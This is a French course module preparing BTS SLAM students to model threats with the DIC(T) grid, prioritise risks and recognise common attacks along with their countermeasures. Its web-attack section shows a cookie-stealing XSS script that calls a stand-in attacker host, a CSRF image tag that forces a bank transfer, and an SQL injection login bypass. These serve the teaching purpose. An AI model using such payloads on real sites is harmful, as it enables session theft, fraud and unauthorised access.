# 🧨 BLOC 2 – Modélisation de la menace et priorisation

*(Penser comme un attaquant, raisonner comme un développeur responsable)*

## Idée centrale du bloc

Avant de sécuriser, il faut **comprendre ce qui est menacé** et **ce qui est prioritaire**.
La cybersécurité commence par une **analyse**, pas par l’ajout de solutions techniques.

On ne fait pas de sécurité *après* une attaque :
on cherche à **réduire les risques dès la conception** (*security by design*).

---

## Ce que vous saurez faire à la fin de ce bloc

À la fin de ce bloc, vous devrez être capable de :

* identifier l'actif principal avant de parler d'attaque,
* rattacher une menace à un ou plusieurs axes DIC(T),
* prioriser un risque selon le contexte,
* proposer une mesure prioritaire cohérente et justifiée.

---

## Notions fondamentales

En cybersécurité :

> **Vulnérabilité × Exposition = Risque**

* Une application peu utilisée → exposition faible
* Une application très utilisée → exposition forte

📌 Le **risque zéro n’existe pas**.
L’objectif est donc double :

* **réduire la probabilité** d’une attaque,
* **détecter rapidement** lorsqu’elle a lieu.

Un code responsable vise :

* le moins de vulnérabilités possibles (code + dépendances),
* une surface d’attaque minimale,
* une capacité à **tracer et comprendre** les incidents.

Chaque élément exposé représente :

* un **vecteur d’attaque potentiel**,
* une surface à maintenir (patchs, mises à jour),
* une source d’information pour la reconnaissance,
* un risque de mauvaise configuration.

---

### Menace, vulnérabilité, attaque, impact (rappel utile)

Pour éviter les confusions dans les réponses :

* **Menace** : ce qui peut nuire (attaquant, erreur, panne)
* **Vulnérabilité** : faiblesse exploitable (bug, mauvais réglage, absence de contrôle)
* **Attaque** : exploitation concrète d'une vulnérabilité
* **Impact** : conséquence métier, technique ou juridique

Exemple SLAM :

* menace : attaquant externe
* vulnérabilité : route `/admin` sans contrôle serveur
* attaque : accès direct à la route
* impact : modification frauduleuse des tarifs (Intégrité)

📌 Le jury valorise cette précision de vocabulaire.

---

## La grille DIC(T) : outil central de raisonnement

La grille **DIC(T)** n’est pas théorique.
Elle permet de **qualifier un risque** et de **justifier une mesure de sécurité**.

### Les 4 axes

* **Confidentialité** : fuite d’informations
* **Intégrité** : modification ou falsification
* **Disponibilité** : indisponibilité du service
* **Traçabilité / Preuve** : impossibilité de démontrer ce qui s’est produit

📌 À l’examen, **toute menace peut être rattachée à au moins un de ces axes**.

---

##  Identifier ce que l’on protège : les actifs

Avant de parler d’attaques, il faut identifier les **actifs**.

### Exemples fréquents en SLAM

* données personnelles (clients, employés)
* données sensibles (santé, handicap, situation sociale)
* accès utilisateurs
* accès administrateurs
* API
* journaux (logs)
* preuves RGPD
* disponibilité d’un service

📌 Erreur classique à éviter :

> décrire une attaque sans dire **ce qui est impacté**.

---

## Prioriser les risques : méthode simple et efficace

### Étape 1 – Identifier l’actif

> Qu’est-ce qui est réellement en jeu ?

Exemples :

* données clients
* accès administrateur
* preuve du consentement

---

### Étape 2 – Identifier l’axe DIC(T) principal

> Quel est le risque dominant ?

Il peut y avoir plusieurs axes concernés, mais **un principal**.

---

### Étape 3 – Évaluer l’impact métier ou juridique

> Quelles conséquences concrètes ?

* fuite de données → sanction RGPD
* fraude → perte financière
* indisponibilité → perte de clients
* absence de preuve → responsabilité juridique engagée

---

### Étape 4 – Proposer une mesure prioritaire

> Une mesure **cohérente**, **réaliste**, **justifiée**

📌 Le jury n’attend **pas** une liste exhaustive.

---

### Matrice simple de priorisation (niveau BTS)

| Probabilité | Impact | Priorité suggérée |
| --- | --- | --- |
| Faible | Faible | Surveillance |
| Faible | Élevé | Prévention ciblée |
| Élevée | Faible | Réduction du volume + détection |
| Élevée | Élevé | Priorité immédiate |

📌 Une logique "probabilité + impact" bien expliquée est largement suffisante à l'examen.

---

### Exemple type examen

**Situation** : accès à une API via un token

* Actif : données personnelles
* Axe principal : **Confidentialité**
* Axes secondaires : Intégrité, Traçabilité
* Impact : fuite de données clients
* Mesures prioritaires :

  * HTTPS
  * durée de validité du token
  * contrôle des rôles (moindre privilège)
  * journalisation des accès

---

## Typologie des attaques.

Le jury n’attend pas un catalogue exhaustif, mais la **compréhension des mécanismes**.

---

## Attaques sur l’authentification

### 🔐 Force brute

Une attaque par **force brute** consiste à tester automatiquement un grand nombre de combinaisons d’identifiants et de mots de passe afin d’accéder à un compte ou un service.

Sources possibles :

* dictionnaires de mots de passe,
* bases de données fuitées,
* règles de transformation,
* génération systématique.

#### Objectif

* accéder à un compte,
* contourner l’authentification,
* récupérer ou modifier des données.

#### Caractéristiques

* automatisée,
* volumineuse,
* parfois distribuée.

#### Impacts DIC(T)

| Axe             | Impact   | Explication              |
| --------------- | -------- | ------------------------ |
| Confidentialité | 🔴🔴🔴🔴 | Compromission de comptes |
| Intégrité       | 🔴🔴🔴   | Modification possible    |
| Disponibilité   | 🔴🔴     | Saturation du service    |
| Traçabilité     | 🔴🔴     | Logs pollués             |

📌 La disponibilité est souvent un **effet secondaire**, pas l’objectif.

#### Mesures prioritaires

* limitation de tentatives
* CAPTCHA
* verrouillage temporaire
* MFA / 2FA
* logs et alertes

---

### 🔐 Credential stuffing

Réutilisation automatisée de **couples identifiant/mot de passe réels** issus de fuites.

* attaque discrète,
* taux de réussite élevé,
* très répandue.

**Axe principal** : Confidentialité
**Mesure clé** : MFA

---

#### Comparatif rapide (à faire retenir)

* **Force brute** : beaucoup de mots de passe sur un compte
* **Password spraying** : même mot de passe sur beaucoup de comptes
* **Credential stuffing** : couples identifiant/mot de passe issus de fuites

📌 Cette distinction aide à justifier les bonnes contre-mesures (MFA, anti-abus, détection).

---

### 🕵️‍♂️ Man-in-the-Middle (MITM)

Interception des échanges entre l’utilisateur et le service. Ce n'est pas une attaque en soi mais bien une manière de mener une attaque. Avec une MITM, on peut faire du session hijacking, du phising, etc. 

* vol d’identifiants,
* vol de cookies de session,
* modification des échanges.

**Axe principal** : Confidentialité
**Mesures clés** : HTTPS, HSTS, cookies sécurisés, MFA

---

### 🎣 Phishing

Tromper l’utilisateur pour qu’il fournisse lui-même ses identifiants. Avec un faut site internet, des mails faisant peurs, etc.

* attaque humaine,
* souvent point d’entrée,
* difficile à bloquer techniquement.

**Axe principal** : Confidentialité
**Mesures clés** : sensibilisation, MFA, filtrage

---

### 🔓 Session hijacking

Vol d’un **cookie de session** pour usurper une identité.

* pas besoin du mot de passe,
* possible via MITM ou XSS,
* très discret.

**Axe principal** : Confidentialité + Traçabilité
**Mesures clés** : cookies Secure/HttpOnly, expiration, HTTPS

---


# 🧨 Attaques Web

## 🔥 XSS – Cross-Site Scripting

### Définition

Une attaque **XSS** consiste à **injecter du code JavaScript malveillant** dans une application web afin qu’il soit exécuté dans le navigateur d’un autre utilisateur.

👉 Le serveur n’est pas directement piraté :
c’est **le navigateur de la victime** qui exécute le script.

---

### Objectifs de l’attaquant

* **Voler des cookies de session**
* **Usurper l’identité d’un utilisateur**
* **Modifier l’affichage ou le comportement de la page**
* **Propager l’attaque à d’autres utilisateurs**

---

### Exemple concret (niveau SLAM)

Un champ « commentaire » n’est pas filtré :

```html
<script>
  fetch("https://attaquant.com?cookie=" + document.cookie);
</script>
```

➡️ Le script s’exécute chez chaque utilisateur qui consulte la page.
➡️ Les cookies de session sont transmis à l’attaquant.
➡️ **Session hijacking sans MITM.**

---

### Impacts selon la grille DIC(T)

* **Confidentialité** : vol de session, accès aux données
* **Intégrité** : modification de l’interface ou des actions
* **Traçabilité** : actions attribuées à la victime

📌 Le XSS est souvent **le point d’entrée** vers d’autres attaques.

---

### Pourquoi c’est critique

> Le XSS transforme une faille applicative en **attaque utilisateur à grande échelle**.

---

### Variantes utiles à connaître (sans tout détailler)

* **XSS stocké** : payload enregistré en base (ex: commentaire)
* **XSS réfléchi** : payload renvoyé immédiatement dans la réponse
* **XSS DOM-based** : faille côté manipulation DOM dans le navigateur

📌 En SLAM, l'exemple "commentaire stocké" est souvent le plus parlant.

---

## 🎯 CSRF – Cross-Site Request Forgery

### Définition

Une attaque **CSRF** consiste à forcer un utilisateur **déjà authentifié** à exécuter une action **à son insu**, simplement en visitant une page piégée.

👉 Aucun mot de passe n’est volé.
👉 Le navigateur agit **légitimement**, avec la session active.

---

### Préconditions d'une attaque CSRF (raisonnement utile)

Pour qu'un CSRF soit plausible, il faut généralement :

* un utilisateur déjà authentifié,
* des cookies envoyés automatiquement par le navigateur,
* une action modifiant l'état (ex: changement d'email, virement),
* absence de protection CSRF côté serveur.

📌 Cela permet d'expliquer pourquoi certains contextes sont plus exposés que d'autres.

---

### Objectifs de l’attaquant

* déclencher une action sensible :

  * changement d’email,
  * virement,
  * suppression de données,
  * modification de mot de passe.

---

### Exemple concret

Un utilisateur connecté à un site bancaire visite une page malveillante contenant :

```html
<img src="https://banque.com/virement?montant=1000&dest=attaquant">
```

➡️ Le navigateur envoie la requête avec les cookies de session.
➡️ Le serveur croit à une action volontaire.
➡️ Le virement est effectué.

---

### Impacts selon la grille DIC(T)

* **Intégrité** : actions non souhaitées
* **Traçabilité** : actions semblent légitimes

📌 Le CSRF exploite **la confiance du serveur dans le navigateur**.

---

### Différence clé avec XSS (à faire retenir)

* XSS : le **code est injecté**
* CSRF : la **requête est forcée**

---

# 🧨 Attaques sur les données

## 💣 Injection SQL

### Définition

Une **injection SQL** consiste à injecter du code SQL dans une requête afin de **manipuler la base de données** au-delà de ce qui est prévu.

👉 L’application exécute une requête qu’elle **ne maîtrise plus**.

---

### Objectifs de l’attaquant

* lire des données sensibles,
* modifier ou supprimer des données,
* contourner l’authentification,
* obtenir des privilèges élevés.

---

### Exemple simple

Requête vulnérable :

```sql
SELECT * FROM users WHERE login = '$login' AND password = '$password';
```

Entrée utilisateur :

```
login: admin
password: ' OR '1'='1
```

Requête finale :

```sql
SELECT * FROM users WHERE login = 'admin' AND password = '' OR '1'='1';
```

➡️ Connexion sans mot de passe.

---

### Impacts selon la grille DIC(T)

* **Confidentialité** : fuite de données
* **Intégrité** : altération ou suppression
* **Disponibilité** : base rendue inutilisable

📌 Une injection SQL peut **détruire une application entière**.

---

### Pourquoi c’est toujours au programme

Parce que c’est :

* simple à comprendre,
* très destructeur,
* encore fréquent en cas de code mal protégé.

---

# 🧠 Attaques humaines

## Le facteur humain

Même avec :

* un code sécurisé,
* des serveurs à jour,
* des contrôles d’accès stricts,

👉 **l’humain reste une surface d’attaque majeure**.

---

### Exemples d’attaques humaines

* phishing,
* mots de passe faibles,
* réutilisation de mots de passe,
* clic sur un lien malveillant,
* partage d’identifiants.

---

### Pourquoi c’est critique

> La sécurité repose sur le **maillon le plus faible**.

Une attaque humaine :

* contourne les protections techniques,
* rend les actions difficiles à tracer,
* est souvent le point de départ d’attaques plus graves.

---

### Axes DIC(T) impactés

* **Confidentialité** : divulgation volontaire ou involontaire
* **Traçabilité** : actions légitimes en apparence

---

### Message clé à faire passer

> La cybersécurité n’est pas qu’un problème de code,
> c’est aussi un problème de **comportements**.

---

## 🧠 Synthèse rapide (examen)

| Type d’attaque    | Cible principale       |
| ----------------- | ---------------------- |
| XSS               | Navigateur utilisateur |
| CSRF              | Confiance serveur      |
| Injection SQL     | Base de données        |
| Attaques humaines | Utilisateur            |

# 🧩 Vulnérabilités et CVE

## Qu’est-ce qu’une vulnérabilité ?

Une **vulnérabilité** est une **faiblesse exploitable** dans :

* un logiciel,
* une dépendance,
* une configuration,
* une architecture,
* ou un usage.

👉 Ce n’est **pas une attaque**,
👉 c’est **ce qui rend une attaque possible**.

---

### Exemples concrets en SLAM

* formulaire non filtré → XSS possible
* requête SQL construite à la main → injection SQL
* API sans contrôle de rôle → élévation de privilèges
* dépendance obsolète → faille connue exploitable

📌 Une vulnérabilité peut exister **sans être exploitée**, mais elle **augmente le risque**.

---

## Qu’est-ce qu’une CVE ?

Une **CVE (Common Vulnerabilities and Exposures)** est un **identifiant public** attribué à une vulnérabilité connue et documentée.

Exemple :

> CVE-2023-XXXXX : faille permettant l’exécution de code à distance dans une librairie donnée.

👉 Une CVE :

* décrit la vulnérabilité,
* précise les versions affectées,
* indique parfois la gravité (CVSS),
* propose des recommandations.

---

### CVSS (très bref, mais utile)

Le **CVSS** est un score de gravité technique utilisé pour aider à prioriser les corrections.

📌 Important :

* il aide à trier,
* mais il ne remplace pas l'analyse du **contexte métier** et de la grille DIC(T).

---

### Pourquoi les CVE sont importantes

* Elles sont **publiques** → attaquants et défenseurs les connaissent.
* Les outils d’attaque les exploitent automatiquement.
* Les scanners de sécurité se basent dessus.

📌 Une CVE connue et non corrigée est **une porte ouverte**.

---

## Vulnérabilités, CVE et DIC(T)

Une vulnérabilité non corrigée peut impacter :

* **Confidentialité** : fuite de données
* **Intégrité** : modification ou corruption
* **Disponibilité** : service rendu indisponible
* **Traçabilité** : logs altérés ou contournés

---

## À retenir pour l’examen

* Inutile de réciter des numéros de CVE.
* Ce qui compte :

  * comprendre **qu’une faille connue est exploitable**,
  * montrer que **les mises à jour réduisent le risque**,
  * savoir **justifier une mesure**.

---

# 🔥 Menace centrale : l’élévation de privilèges

## Définition

L’**élévation de privilèges** consiste à obtenir des **droits supérieurs** à ceux qui ont été initialement accordés à un utilisateur ou à un service.

👉 C’est souvent **la conséquence**, pas la première étape.

---

## Pourquoi c’est critique

Parce qu’une fois les privilèges élevés :

* l’attaquant contrôle davantage le système,
* les impacts deviennent majeurs,
* **tous les axes DIC(T)** sont touchés.

📌 Une petite faille + trop de droits = **gros incident**.

---

## Exemples concrets en SLAM

* un utilisateur accède à `/admin` via une URL directe,
* une API ne vérifie pas le rôle dans le token,
* une requête SQL est exécutée avec un compte trop permissif,
* un JWT contient tous les droits par défaut,
* une interface cache un bouton sans contrôle serveur.

👉 Le problème n’est pas l’accès…
👉 **c’est ce que l’on peut faire une fois dedans**.

---

## Élévation de privilèges et DIC(T)

| Axe             | Impact                              |
| --------------- | ----------------------------------- |
| Confidentialité | accès à toutes les données          |
| Intégrité       | modification ou suppression globale |
| Disponibilité   | arrêt ou sabotage du service        |
| Traçabilité     | logs compromis ou actions masquées  |

---

## Pourquoi c’est transversal

L’élévation de privilèges :

* amplifie **toutes** les autres attaques,
* transforme un incident mineur en incident critique,
* est souvent liée à des erreurs de conception.

📌 Message clé à faire retenir :

> Ce n’est pas l’attaque qui fait le drame,
> c’est **l’absence de limites**.

---

## Comment réduire le risque (sans entrer dans le bloc 3)

* principe du moindre privilège,
* séparation des rôles,
* contrôles côté serveur systématiques,
* comptes techniques restreints,
* journalisation des actions sensibles.

---

## Synthèse courte (examen)

* **Vulnérabilité** : faiblesse exploitable
* **CVE** : vulnérabilité connue et publique
* **Élévation de privilèges** : facteur aggravant majeur

> La sécurité ne consiste pas à empêcher toute attaque,
> mais à **empêcher qu’une attaque devienne catastrophique**.



## 2.6 Transition vers le bloc 3

À ce stade, on sait :

* quoi protéger,
* contre quoi,
* avec quelle priorité.

Le **bloc 3** montrera **comment réduire ces risques concrètement** :

* rôles,
* contrôles d’accès,
* base de données,
* API,
* code.

Pont utile :

* ces mesures recoupent souvent les référentiels OWASP,
* mais à l'examen on attend surtout une réponse **contextualisée** et justifiée.

---

### 🧠 À retenir (examen)

* Toujours partir de **DIC(T)**
* Identifier l’actif avant l’attaque
* Prioriser avant de proposer
* Réponse structurée > réponse longue

---

## Références externes (menaces / vulnérabilités)

* OWASP Top 10 : <https://owasp.org/Top10>
* OWASP Cheat Sheet Series : <https://cheatsheetseries.owasp.org/>
* MITRE CVE : <https://www.cve.org/>
* NVD (NIST) : <https://nvd.nist.gov/>

---

## Cas réels / rapports (2 encarts rapides)

### Encadré 1 — ANSSI : Panorama de la cybermenace 2024

**Source** : ANSSI, *Panorama de la cybermenace 2024* (publié le **1 mars 2025**)  
<https://cyber.gouv.fr/nous-connaitre/publications/panoramas-de-la-cybermenace/panorama-de-la-cybermenace-2024/>

Intérêt pédagogique :

* excellent support pour identifier des **menaces** et des **actifs**,
* permet de montrer la diversité des objectifs (extorsion, espionnage, déstabilisation),
* aide à justifier la **priorisation** selon le contexte.

### Encadré 2 — CSRB / DHS : intrusion Microsoft Exchange Online (Storm-0558)

**Source** : DHS / CSRB, annonce de publication du rapport sur l'incident Microsoft Exchange Online (**2 avril 2024**)  
<https://www.dhs.gov/archive/news/2024/04/02/cyber-safety-review-board-releases-report-microsoft-online-exchange-incident-summer>

Intérêt pédagogique :

* cas très utile pour modéliser une attaque sur l'**identité** et les **tokens**,
* montre l'importance de la **chaîne de défaillances** (technique + organisation),
* bon exemple pour passer de "vulnérabilité" à "impact majeur".
